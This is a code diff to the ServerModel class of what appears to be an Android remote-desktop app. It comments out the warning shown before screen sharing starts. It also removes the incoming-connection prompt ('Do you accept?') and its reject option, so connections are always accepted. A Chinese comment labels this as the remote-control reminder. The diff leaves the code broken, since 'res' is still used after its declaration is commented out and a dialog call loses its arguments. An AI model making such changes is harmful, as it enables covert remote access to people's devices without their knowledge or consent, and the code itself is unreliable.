@@ -374,7 +374,7 @@ class ServerModel with ChangeNotifier {
     return res;
   }
 
-  /// Toggle the screen sharing service.
+  /// 切换屏幕共享服务。
   toggleService() async {
     if (_isStart) {
       final res = await parent.target?.dialogManager
@@ -407,25 +407,25 @@ class ServerModel with ChangeNotifier {
       if (!await AndroidPermissionManager.check(kManageExternalStorage)) {
         await AndroidPermissionManager.request(kManageExternalStorage);
       }
-      final res = await parent.target?.dialogManager
-          .show<bool>((setState, close, context) {
-        submit() => close(true);
-        return CustomAlertDialog(
-          title: Row(children: [
-            const Icon(Icons.warning_amber_sharp,
-                color: Colors.redAccent, size: 28),
-            const SizedBox(width: 10),
-            Text(translate("Warning")),
-          ]),
-          content: Text(translate("android_service_will_start_tip")),
-          actions: [
-            dialogButton("Cancel", onPressed: close, isOutline: true),
-            dialogButton("OK", onPressed: submit),
-          ],
-          onSubmit: submit,
-          onCancel: close,
-        );
-      });
+      // final res = await parent.target?.dialogManager
+      //     .show<bool>((setState, close, context) {
+      //   submit() => close(true);
+      //   return CustomAlertDialog(
+      //     title: Row(children: [
+      //       const Icon(Icons.warning_amber_sharp,
+      //           color: Colors.redAccent, size: 28),
+      //       const SizedBox(width: 10),
+      //       Text(translate("Warning")),
+      //     ]),
+      //     // content: Text(translate("android_service_will_start_tip")),
+      //     // actions: [
+      //     //   dialogButton("Cancel", onPressed: close, isOutline: true),
+      //     //   dialogButton("OK", onPressed: submit),
+      //     // ],
+      //     onSubmit: submit,
+      //     onCancel: close,
+      //   );
+      // });
       if (res == true) {
         startService();
       }
@@ -600,10 +600,10 @@ class ServerModel with ChangeNotifier {
   void showLoginDialog(Client client) {
     showClientDialog(
       client,
-      client.isFileTransfer ? "File Connection" : "Screen Connection",
-      'Do you accept?',
-      'android_new_connection_tip',
-      () => sendLoginResponse(client, false),
+      // client.isFileTransfer ? "File Connection" : "Screen Connection",//远控时候的提醒
+      // 'Do you accept?',
+      // 'android_new_connection_tip',
+      // () => sendLoginResponse(client, false),
       () => sendLoginResponse(client, true),
     );
   }
